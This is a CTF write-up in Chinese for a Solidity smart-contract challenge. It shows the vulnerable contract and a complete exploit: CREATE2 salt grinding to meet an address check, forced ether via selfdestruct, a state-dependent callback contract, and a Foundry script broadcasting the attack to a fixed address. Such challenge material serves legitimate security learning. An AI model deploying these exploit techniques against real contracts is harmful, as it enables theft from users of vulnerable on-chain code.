# yourname

# 源码
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

interface Wish_Maker {
    function wish_amount() external view returns (uint256);
}

//0x87c39e970f8B82c4e36888d83162a695FB113CCE
contract level {
    constructor() {
        owner = msg.sender;
    }

    string public name = "sanye";
    string public symbol = "CTF";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;
    bool public yourname;

    mapping(address => bool) public started;
    mapping(address => uint256) public wishes;
    mapping(address => bool) public wish_made;
    mapping(address => uint8) public callCounter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowances;

    modifier challenge_started() {
        require(started[tx.origin] == true, "no : started[tx.origin] == true");
        _;
    }

    modifier remains_wish() {
        require(wishes[tx.origin] > 0, "no : wishes[tx.origin] > 0");
        _;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "no : owner == msg.sender");
        _;
    }

    function deposit() external payable {
        uint256 amount = msg.value;
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }

    function allowance(
        address _owner,
        address _spender
    ) external view returns (uint256) {
        return allowances[_owner][_spender];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        require(balanceOf[from] >= amount, "not enough balance");
        require(allowances[from][msg.sender] >= amount, "not enough allowance");

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowances[from][msg.sender] -= amount;
        return true;
    }

    function start_challenge() public {
        require(started[tx.origin] == false);
        started[tx.origin] = true; //满足challenge_started
        wishes[tx.origin] = 1; //满足remains_wish
    }

    function end_challenge(address addr) public onlyOwner {
        started[addr] = false;
        wishes[addr] = 0;
        wish_made[addr] = false;
    }

    function withdraw(uint256 amount) external payable {
        require(balanceOf[msg.sender] > amount, "not enough token");
        balanceOf[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "no call");
    }

    function approve(address from, address to, uint256 amount) external {
        allowances[from][to] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "not enough balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function wish_making() external challenge_started remains_wish {
        Wish_Maker wish_maker = Wish_Maker(msg.sender);
        bool is_less_than = false;
        if (wish_maker.wish_amount() < 1) {
            is_less_than = true;
        }

        wish_made[tx.origin] = true; //以这个bool值为锚点做三元运算符

        if (is_less_than) {
            wishes[tx.origin] = wish_maker.wish_amount();
        } else {
            wishes[tx.origin]--;
        }
    }

    function regret() external challenge_started {
        wishes[tx.origin] = 1;
        wish_made[tx.origin] = false;
    }

    modifier level1() {
        require(tx.origin != msg.sender, "no : tx.origin != msg.sender"); //攻击合约,ok
        _;
    }

    modifier level2() {
        require(
            uint256(uint160(msg.sender)) % 77 == 7,
            "no : uint256(uint160(msg.sender)) % 77 == 7"
        ); //create预测指定Attack地址,ok
        _;
    }

    modifier level3() {
        require(address(this).balance > 0, "no : address(this).balance > 0"); //level自己有钱
        _;
    }

    modifier level4() {
        require(
            wishes[tx.origin] > 1 ? true : false == true,
            "no : wishes[tx.origin] > 1"
        ); //
        _;
    }

    receive() external payable {
        revert(); //正常收款不了,需要自毁强制打钱
    }

    function check() external level1 level2 level3 level4 {
        owner = tx.origin;
        yourname = true;
        require(yourname = true, "no: your name is not true");
    }

    function isSolved() external view returns (bool) {
        require(yourname == true, "no");
        return true;
    }
}

```

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.9;

import {Attack} from "./Attack.sol";

contract Deployer {
    function computeSalt(address target) public view returns (bytes32) {
        // 找salt
        for (uint256 i = 0; i < 10000; i++) {
            bytes32 salt = bytes32(i);
            address predictedAddress = predictAddress(salt, target);
            if (uint256(uint160(predictedAddress)) % 77 == 7) {
                return salt;
            }
        }
        revert("no suitable salt");
    }

    function predictAddress(
        bytes32 salt,
        address example
    ) public view returns (address) {
        bytes memory bytecode = abi.encodePacked(
            type(Attack).creationCode,
            abi.encode(example)
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this), // 部署者地址
                salt,
                keccak256(bytecode)
            )
        );
        return address(uint160(uint256(hash))); //预测的地址
    }

    function deployer(
        bytes32 salt,
        address paekkoAddress
    ) public returns (address) {
        Attack a = new Attack{salt: salt}(payable(paekkoAddress));
        return address(a);
    }
}

contract SelfDestructHelper {
    constructor() payable {}

    function boom(address payable addr) external payable {
        selfdestruct(addr);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {level, Wish_Maker} from "./1.sol";

contract Attack is Wish_Maker {
    level public sanye;
    uint256 public count = 1;

    constructor(address payable addr) payable {
        sanye = level(addr);
    }

    function wish_amount() external view override returns (uint256) {
        return !sanye.wish_made(tx.origin) ? 0 : 3;
    }

    function attack() external payable {
        sanye.deposit{value: 1 ether}();

        sanye.start_challenge();

        sanye.wish_making();

        sanye.check();
        // // // 第一步：deposit
        // (bool ok1, ) = address(sanye).call{value: 1 ether}(
        //     abi.encodeWithSignature("deposit()")
        // );
        // require(ok1, "deposit failed");

        // // 第二步：start_challenge
        // (bool ok2, ) = address(sanye).call(
        //     abi.encodeWithSignature("start_challenge()")
        // );
        // require(ok2, "start_challenge failed");

        // // 第三步：wish_making
        // (bool ok3, ) = address(sanye).call(
        //     abi.encodeWithSignature("wish_making()")
        // );
        // require(ok3, "wish_making failed");

        // // 第五步：check
        // (bool ok5, ) = address(sanye).call(abi.encodeWithSignature("check()"));
        // require(ok5, "check failed");
    }

    fallback() external {
        sanye.wish_making();
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Attack} from "../src/Attack.sol";
import {Script, console} from "forge-std/Script.sol";
import {Deployer, SelfDestructHelper} from "../src/Deployer.sol";
import {level} from "../src/1.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Deployer deployer = new Deployer();
        SelfDestructHelper selfdestruct = new SelfDestructHelper();

        selfdestruct.boom{value: 1 ether}(
            payable(0xfce07041c73709123DE77b42655476857B66Fd8c) //先给level强制自毁打钱
        );
        level sanye = level(
            payable(0xfce07041c73709123DE77b42655476857B66Fd8c)
        );
        bytes32 salt = deployer.computeSalt(
            0xfce07041c73709123DE77b42655476857B66Fd8c
        );
        address attack = deployer.deployer(
            salt,
            0xfce07041c73709123DE77b42655476857B66Fd8c
        );
        Attack(attack).attack{value: 1 ether}();
        require(sanye.isSolved() == true, "you are not sanye");
        vm.stopBroadcast();
    }
}

```



> 更新: 2025-09-12 23:55:03  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/vl6n8hk2w6gmbflr>